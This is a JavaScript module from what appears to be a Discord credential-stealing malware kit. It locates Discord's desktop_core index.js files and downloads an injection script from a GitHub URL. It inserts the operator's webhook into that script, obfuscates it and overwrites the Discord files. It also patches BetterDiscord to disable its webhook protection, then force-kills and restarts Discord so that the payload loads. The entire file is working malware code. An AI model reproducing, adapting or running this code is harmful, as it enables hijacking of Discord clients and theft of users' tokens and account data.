const fs = require("fs");
const axios = require("axios");
const path = require("path");
const process = require("process");
const obf = require("javascript-obfuscator");
const buff = require("buffer-replace");
const { exec, execSync } = require("child_process");

const GET_CONFIG = require("./../../config/config")();

const LOCAL_APPDATA = process.env.localappdata;
const APPDATA = process.env.appdata;

const INJECT_URL = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"; //BY K4ITRUN !!

const INJECT_PATHS = [];

function DC_DIRECTORIES() {
    try {
        return fs.readdirSync(LOCAL_APPDATA).filter((f) => f.includes("iscord")).map((f) => path.join(LOCAL_APPDATA, f));
    } catch (err) {
        console.error(err);
        return [];
    }
}

function FIND_INDEX(f) {
    try {
        fs.readdirSync(f).forEach((d) => {
            let FILE_P = path.join(f, d);
            if (fs.statSync(FILE_P).isDirectory()) {
                FIND_INDEX(FILE_P);
            } else {
                if (d === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) INJECT_PATHS.push(FILE_P);
            }
        });
    } catch (e) {
        console.error("Error in find index:", e);
    }
}

function ID(h) {
    let c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let r = '';
    for (let i = 0; i < h; i++) {
        r += c.charAt(Math.floor(Math.random() * c.length));
    }
    return r;
}

async function INJECT() {
    try {
        let res = await axios.get(INJECT_URL, { headers: { aurathemes: true } }),
            encode = obf.obfuscate(res.data.replace("%WEBHOOK%", GET_CONFIG.webhook).replace("%ID_REQUEST%", ID(10)), { ignoreRequireImports: true, compact: true, controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5, deadCodeInjection: false, deadCodeInjectionThreshold: 0.01, debugProtection: false, debugProtectionInterval: 0, disableConsoleOutput: true, identifierNamesGenerator: "hexadecimal", log: false, numbersToExpressions: false, renameGlobals: false, selfDefending: false, simplify: true, splitStrings: false, splitStringsChunkLength: 5, stringArray: true, stringArrayEncoding: ["base64"], stringArrayIndexShift: true, stringArrayRotate: false, stringArrayShuffle: false, stringArrayWrappersCount: 5, stringArrayWrappersChainedCalls: true, stringArrayWrappersParametersMaxCount: 5, stringArrayWrappersType: "function", stringArrayThreshold: 1, transformObjectKeys: false, unicodeEscapeSequence: false }),
            payload = encode.getObfuscatedCode();
        INJECT_PATHS.forEach((f) => {
            try {
                fs.promises.writeFile(f, payload, { encoding: "utf8",flag: "w" });
            } catch (e) {
                console.error("Error writing file:", e);
            }
        });
    } catch (e) {
        console.error("Error in inject:", e);
    }
}

async function BETTER_BROKE() {
    try {
        let dir = path.join(LOCAL_APPDATA, "BetterDiscord/data/betterdiscord.asar");
        if (fs.existsSync(dir)) {
            let c = await fs.promises.readFile(dir);
            await fs.promises.writeFile(dir, buff(c, "api/webhooks", "aurathemes"));
        }
    } catch (err) {
        console.error("Error in better broke:", err);
    }
}

async function KILL_ALL() {
    await exec('tasklist', async (err, s, stderr) => {
        for (let c of [
            'Discord.exe',
            'DiscordCanary.exe',
            'discordDevelopment.exe',
            'DiscordPTB.exe'
        ]) {
            if (s.includes(c)) {
                await exec(`taskkill /F /T /IM ${c}`, (err) => { })
                await exec(`"${LOCAL_APPDATA}\\${c.replace('.exe', '')}\\Update.exe" --processStart ${c}`, (err) => { })
            }
        }
    })
};

async function FIND_INJECT(f) {
    try {
        let d = await fs.promises.readdir(f);
        for (const x of d) {
            const FILE_P_ = path.join(f, x);
            const FILE_S_ = await fs.promises.stat(FILE_P_);
            if (FILE_S_.isDirectory()) {
                if (x === "aura") {
                    await fs.rmdirSync(FILE_P_);
                } else {
                    await FIND_INJECT(FILE_P_);
                }
            }
        }
    } catch (error) {
        console.error("Error in find Inject:", error);
    }
}

async function DISCORD_INJECTED(e) {
    try {
        if (e === "no") return;
        let d = DC_DIRECTORIES();
        for (const paths of d) {
            FIND_INDEX(paths);
        }
        for (const paths of d) {
            await FIND_INJECT(paths);
        }
        await INJECT();
        await BETTER_BROKE();
        if (GET_CONFIG.kill.discords === "yes") {
            await KILL_ALL();
        } else {
            return;
        }
    } catch (e) {
        console.error("Error in discord injected:", e);
    }
}

module.exports = {
    discordInjected: DISCORD_INJECTED,
};
